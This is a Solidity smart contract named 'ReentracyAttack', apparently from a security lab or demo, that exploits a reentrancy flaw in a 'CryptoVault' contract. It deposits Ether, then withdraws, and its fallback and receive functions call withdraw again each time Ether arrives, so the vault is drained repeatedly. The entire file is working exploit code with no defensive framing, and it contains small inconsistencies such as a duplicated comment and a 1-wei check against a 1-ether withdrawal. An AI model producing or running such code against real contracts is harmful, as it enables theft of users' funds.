// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.6.0;

import "contracts/CryptoVault.sol";

contract ReentracyAttack {
    // Reference to the CryptoVault contract
    // Reference to the CryptoVault contract
    CryptoVault public dao;

    constructor(address payable _dao) public {
        dao = CryptoVault(_dao);
    }

    function attack() external payable {
        require(msg.value >= 1, "Insufficient ether sent");

        // Deposit a small amount to trigger the reentrancy
        dao.deposit{value: msg.value}();

        // Call withdraw to trigger the reentrancy attack
        dao.withdraw(1 ether);

        // After the attack, the contract will still have an incorrect balance
        // The attacker's contract can then withdraw again
    }

    fallback() external payable {
        // This function is required to receive Ether when calling deposit
        if (dao.getBalance() >= 1){
            dao.withdraw(1 ether);
        }

    }

    receive() external payable {
        // This function is required to receive Ether when calling deposit
        if (dao.getBalance() >= 1){
            dao.withdraw(1 ether);
        }

    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
